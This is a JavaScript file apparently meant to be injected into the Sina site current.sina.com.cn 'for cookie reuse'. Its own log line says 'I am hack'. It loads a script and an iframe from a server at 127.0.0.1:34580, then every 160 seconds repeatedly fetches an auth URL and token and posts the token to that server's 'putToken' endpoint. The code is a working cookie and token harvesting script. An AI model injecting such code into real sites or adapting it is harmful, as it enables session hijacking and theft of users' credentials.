//to inject js for cookie reuse, https://current.sina.com.cn/
console.log("I am hack, from http://127.0.0.1:34580/file?sina_websocket_tickets_reporter.js");
var script=document.createElement('script');
script.type='text/javascript';
script.src='http://127.0.0.1:34580/file?jQuery.js';
document.getElementsByTagName('head')[0].appendChild(script);


var frame = document.createElement('iframe');
var txtContainer = document.createElement('div');
var frameContainer = document.createElement('div');

 frameContainer.appendChild(txtContainer)
 frameContainer.appendChild(frame)

 document.getElementsByTagName('body')[0].appendChild(frameContainer);
 frameContainer.style.width = '100%'
 frameContainer.style.height = '300px'
 frame.style.width = '100%'
 frame.style.height = '100%'
txtContainer.style.width='100%'

var toUrl ='http://127.0.0.1:34580/putCookie';

var getAuthUrl = 'http://127.0.0.1:34580/authUrl';
var putAuthToken='http://127.0.0.1:34580/putToken'
frame.src = toUrl;

var putAuthFunc = function(token){
	$.get(
		putAuthToken,
		token,
		function(data){
			serverRet = data;
			console.log('putAuthFunc result: ' + serverRet);
			var ret = decodeURIComponent(serverRet);
			
			
			txtContainer.style['background-color']='#d5efd5';
			var txt = ret.replace(/\"/g, "").replace(/[\{\}\(\)]/g, "<br>").replace(/,/g, ",<br>");
			txtContainer.innerHTML=  "<br> refresh Time : " + new Date().Format("yyyy-MM-dd HH:mm:ss") + "<br><br>" + txt+"<br><br>" + ret;
	    }, 
	    'text');
}

var getAuthTokenFunc = function(authUrl){
	$.get(
		authUrl,
		{},
		function(data){
			serverRet = data;
			console.log('getAuthToken: ' + serverRet);
			if(serverRet != null && serverRet.length > 0){
				console.log('putAuth: ' + serverRet);
				putAuthFunc(serverRet);
			}
	    }, 
	    'text');
}

var getAuthUrlFunc = function (){
	$.get(
		getAuthUrl,
		{},
		function(data){
			serverRet = data;
			console.log('authUrl: ' + serverRet);
			if( serverRet != null && serverRet.length > 0){
				getAuthTokenFunc(serverRet);
			}
	    }, 
	    'text');
}

setTimeout(function(){
	getAuthUrlFunc();
	console.log('system inited');
	setInterval(getAuthUrlFunc, 160000);
},3000);

Date.prototype.Format = function (fmt) { //author: meizz 
    var o = {
        "M+": this.getMonth() + 1, //月份 
        "d+": this.getDate(), //日 
        "H+": this.getHours(), //小时 
        "m+": this.getMinutes(), //分 
        "s+": this.getSeconds(), //秒 
        "q+": Math.floor((this.getMonth() + 3) / 3), //季度 
        "S": this.getMilliseconds() //毫秒 
    };
    if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
    for (var k in o)
    if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
    return fmt;
}
